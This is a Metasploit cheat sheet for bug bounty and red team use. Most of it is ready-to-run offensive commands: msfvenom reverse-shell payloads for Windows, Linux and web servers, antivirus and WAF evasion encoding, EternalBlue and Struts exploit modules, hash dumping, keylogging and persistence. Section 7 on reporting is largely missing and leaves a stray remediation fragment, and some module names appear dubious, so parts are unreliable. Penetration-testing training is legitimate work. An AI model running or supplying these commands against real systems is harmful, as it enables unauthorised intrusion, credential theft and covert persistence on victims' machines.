Metasploit Reverse Shell Cheat Sheet
This cheat sheet provides a comprehensive guide to using Metasploit for bug bounty and red team operations, focusing on generating reverse shells, exploiting vulnerabilities, and performing reconnaissance. It includes commands for msfvenom, Metasploit modules, and workflows for common tasks. All commands are designed to align with ethical hacking principles, and users must adhere to responsible disclosure and scope defined by bug bounty programs.

Table of Contents
	1	Msfvenom Payload Creation
	◦	Windows Reverse Shells
	◦	Linux Reverse Shells
	◦	Web Shells (PHP, ASP, JSP, WAR)
	◦	Encoding and Evasion Techniques
	2	Metasploit Console Commands
	◦	Initial Setup
	◦	Payload Configuration
	◦	Exploitation Modules
	◦	Post-Exploitation Modules
	3	Reconnaissance with Metasploit
	◦	Scanning and Enumeration
	◦	OSINT Integration
	4	Exploitation Workflow
	◦	Setting Up Listeners
	◦	Exploiting Common Vulnerabilities
	5	Post-Exploitation
	◦	Privilege Escalation
	◦	Persistence
	◦	Data Exfiltration
	6	Bypassing Security Measures
	◦	AV Evasion
	◦	WAF Bypassing
	7	Reporting for Bug Bounty
	◦	Generating Professional Reports
	8	Ethical Hacking Reminder

1. Msfvenom Payload Creation
msfvenom is used to generate payloads for various platforms. Replace and with your attacking machine’s IP and port.
Windows Reverse Shells
	•	Basic Reverse Shell (TCP) msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o shell_reverse.exe
	•	
	•	Meterpreter Reverse Shell (TCP) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o meterpreter_reverse.exe
	•	
	•	Encoded to Avoid AV Detection msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_encoded.exe
	•	
	•	Stageless Meterpreter (x64) msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= LPORT= -f exe -o meterpreter_x64.exe
	•	
Linux Reverse Shells
	•	Basic Reverse Shell (x86) msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf -o shell.elf
	•	
	•	Meterpreter Reverse Shell (x64) msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT= -f elf -o msf.bin
	•	
	•	List Linux Meterpreter Payloads msfvenom --list | grep linux.*meterpreter
	•	
Web Shells
	•	PHP Meterpreter Reverse Shell msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
	•	
	•	ASP Reverse Shell msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
	•	
	•	JSP Reverse Shell msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
	•	
	•	WAR Reverse Shell msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
	•	
Encoding and Evasion Techniques
	•	Encode Payload to Bypass AV msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -i 5 -o encoded_shell.exe
	•	
	•	Custom Encoder msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/alpha_mixed -i 3 -o alpha_encoded_shell.exe
	•	
	•	List Available Encoders msfvenom --list encoders
	•	

2. Metasploit Console Commands
Start Metasploit:
msfconsole
Initial Setup
	•	Update Metasploit msfupdate
	•	
	•	Search for Modules search 
	•	
	•	Use a Module use 
	•	
	•	Show Module Options show options
	•	
	•	Set Module Options set  
Payload Configuration
	•	Set Payload set payload 
	•	
	•	Show Available Payloads show payloads
	•	
	•	Set Listener (Multi/Handler) use exploit/multi/handler
	•	set payload windows/meterpreter/reverse_tcp
	•	set LHOST 
	•	set LPORT 
	•	exploit
	•	
Exploitation Modules
	•	Example: EternalBlue (MS17-010) use exploit/windows/smb/ms17_010_eternalblue
	•	set RHOSTS 
	•	set payload windows/x64/meterpreter/reverse_tcp
	•	set LHOST 
	•	set LPORT 
	•	exploit
	•	
	•	Example: Apache Struts RCE (CVE-2017-5638) use exploit/multi/http/struts2_content_type_rce
	•	set RHOSTS 
	•	set RPORT 
	•	set TARGETURI 
	•	set payload java/meterpreter/reverse_tcp
	•	set LHOST 
	•	set LPORT 
	•	exploit
	•	
Post-Exploitation Modules
	•	Check Privilege Level getuid
	•	
	•	Escalate Privileges (Windows) use post/windows/escalate/getsystem
	•	exploit
	•	
	•	Dump Hashes (Windows) use post/windows/gather/hashdump
	•	exploit
	•	
	•	List Running Processes ps
	•	
	•	Migrate to Another Process migrate 
	•	

3. Reconnaissance with Metasploit
Scanning and Enumeration
	•	Nmap Integration db_nmap -sV -p- 
	•	
	•	SMB Enumeration use auxiliary/scanner/smb/smb_version
	•	set RHOSTS 
	•	run
	•	
	•	HTTP Enumeration use auxiliary/scanner/http/dir_scanner
	•	set RHOSTS 
	•	set THREADS 10
	•	run
	•	
	•	Discover Open Ports and Services use auxiliary/scanner/portscan/tcp
	•	set RHOSTS 
	•	set PORTS 1-65535
	•	run
	•	
OSINT Integration
	•	DNS Enumeration use auxiliary/gather/dns_enum
	•	set DOMAIN 
	•	run
	•	
	•	HTTP Header Analysis use auxiliary/scanner/http/http_header
	•	set RHOSTS 
	•	run
	•	

4. Exploitation Workflow
Setting Up Listeners
	•	Start Multi/Handler for Reverse Shell use exploit/multi/handler
	•	set payload windows/meterpreter/reverse_tcp
	•	set LHOST 
	•	set LPORT 
	•	exploit
	•	
Exploiting Common Vulnerabilities
	•	SQL Injection (Manual Testing with Metasploit) use auxiliary/scanner/http/sqlmap
	•	set RHOSTS 
	•	set TARGETURI 
	•	run
	•	
	•	XSS Payload Delivery use exploit/multi/browser/xss_injection
	•	set TARGETURI 
	•	set PAYLOAD 
	•	exploit
	•	
	•	File Inclusion (LFI/RFI) use exploit/multi/http/rfi_remote_file_inclusion
	•	set RHOSTS 
	•	set TARGETURI 
	•	exploit
	•	

5. Post-Exploitation
Privilege Escalation
	•	Windows Local Exploit Suggester use post/multi/recon/local_exploit_suggester
	•	set SESSION 
	•	run
	•	
	•	Linux Privilege Escalation use post/linux/gather/checkvm
	•	run
	•	
Persistence
	•	Windows Persistence use post/windows/manage/persistence_exe
	•	set SESSION 
	•	set EXE_PATH 
	•	run
	•	
	•	Linux Cron Persistence use post/linux/manage/cron_persistence
	•	set SESSION 
	•	run
	•	
Data Exfiltration
	•	Download Files download  
	•	
	•	Keylogger use post/windows/capture/keylog_recorder
	•	set SESSION 
	•	run
	•	

6. Bypassing Security Measures
AV Evasion
	•	Use Custom Encoders msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -i 10 -o av_bypass.exe
	•	
	•	** Veil Framework Integration** (External Tool) Generate payloads with Veil to further obfuscate: veil -t Evasion -p c/meterpreter/rev_tcp --msfvenom windows/meterpreter/reverse_tcp
	•	
WAF Bypassing
	•	Modify Payloads for WAF Evasion Use obfuscated payloads or encode parameters: msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw | base64 > shell_b64.php
	•	
	•	Test WAF Rules use auxiliary/scanner/http/waf_detect
	•	set RHOSTS 
	•	run
	•	

**Remediation**:  
- Patch to [latest version].  
- Implement input validation and WAF rules.  
- Restrict file upload functionality.

**Attachments**:  
- [Screenshots, logs, or videos]

8. Ethical Hacking Reminder
	•	Responsible Disclosure: Always report findings to the bug bounty program and adhere to their scope and rules.
	•	Authorized Testing Only: Do not test systems without explicit permission. Unauthorized testing is illegal and unethical.
	•	Respect Scope: Stay within the defined scope of the bug bounty program to avoid legal issues.


